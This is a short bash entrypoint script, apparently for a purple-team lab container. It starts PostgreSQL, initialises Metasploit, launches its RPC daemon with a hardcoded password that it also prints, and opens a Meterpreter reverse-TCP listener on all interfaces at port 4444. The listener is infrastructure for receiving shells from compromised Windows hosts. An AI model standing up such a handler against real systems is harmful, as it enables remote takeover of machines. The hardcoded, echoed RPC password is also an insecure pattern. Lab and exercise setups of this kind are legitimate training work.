#!/bin/bash

echo "💥 Démarrage de Metasploit Framework..."

# Démarrer PostgreSQL
if command -v service >/dev/null 2>&1; then
    service postgresql start
else
    echo "🔄 Lancement direct de PostgreSQL (pg_ctl)…"
    su - postgres -c "pg_ctl -D /var/lib/postgresql/data -l /var/lib/postgresql/data/logfile start" || true
fi

# Attendre que PostgreSQL soit prêt
sleep 5

# Initialiser la base de données Metasploit
echo "Initialisation de la base de données..."
msfdb init

# Démarrer msfrpcd (RPC daemon)
echo "Démarrage de msfrpcd..."
msfrpcd -P PurpleTeam2024! -S -f &

# Attendre que le RPC soit prêt
sleep 10

# Démarrer un handler multi/handler en arrière-plan
echo "Configuration du multi/handler..."
msfconsole -x "
use exploit/multi/handler;
set PAYLOAD windows/meterpreter/reverse_tcp;
set LHOST 0.0.0.0;
set LPORT 4444;
run -j;
exit" &

echo "💥 Metasploit est prêt!"
echo "RPC: msfrpc://127.0.0.1:55553"
echo "Password: PurpleTeam2024!"
echo "Handler: 0.0.0.0:4444"

# Garder le container en vie
tail -f /dev/null 